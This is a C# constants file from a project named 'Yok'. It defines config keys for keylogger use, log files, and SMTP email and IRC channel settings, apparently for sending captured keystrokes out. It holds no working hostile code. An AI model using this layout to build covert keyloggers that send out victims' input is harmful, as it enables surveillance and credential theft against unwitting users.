// Yok 
// https://github.com/erickjung/yok
//
// Copyright (c) 2012-2015 Erick Jung
//
// This code is distributed under the terms and conditions of the MIT license.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.

namespace yok.App
{
    /// <summary>
    ///     Helper class to use for globals vars
    /// </summary>
    public static class Globals
    {
        // App details
        public const string YokAppName = "YOK";
        public const string YokAppCopyright = "Copyright (c) yokon.me";
        // constants files
        public const string YokFileKey = "yok.txt";
        public const string YokFileLog = "process.txt";
        public const string YokCfgLog = "yok_log.xml";
        // ----------------------------------------------------------------
        // CONFIG
        // ----------------------------------------------------------------

        // app settings
        public const string YokXmlDataencrypted = "use_data_encrypted";
        public const string YokXmlTimerinterval = "timer_interval";
        public const string YokXmlTimetoupdate = "time_to_update";
        public const string YokXmlLastupdate = "last_update";
        public const string YokXmlInputtitle = "input_title";
        public const string YokXmlInputmsg = "input_message";
        public const string YokXmlInputpwd = "input_password";
        // service settings
        public const string YokXmlUsekeylogger = "use_keylogger";
        public const string YokXmlUseemail = "use_email";
        public const string YokXmlUseirc = "use_irc";
        // email
        public const string YokXmlEmaillogin = "login";
        public const string YokXmlEmailpwd = "password";
        public const string YokXmlEmailsmtp = "smtp";
        public const string YokXmlEmailsmtpport = "smtp_port";
        public const string YokXmlEmailssl = "use_ssl";
        public const string YokXmlEmailsubject = "subject";
        public const string YokXmlEmailmsg = "message";
        public const string YokXmlEmailto = "to";
        // irc
        public const string YokXmlIrcserver = "server";
        public const string YokXmlIrcport = "port";
        public const string YokXmlIrcchannel = "channel";
        public const string YokXmlIrcnick = "nick";
    }
}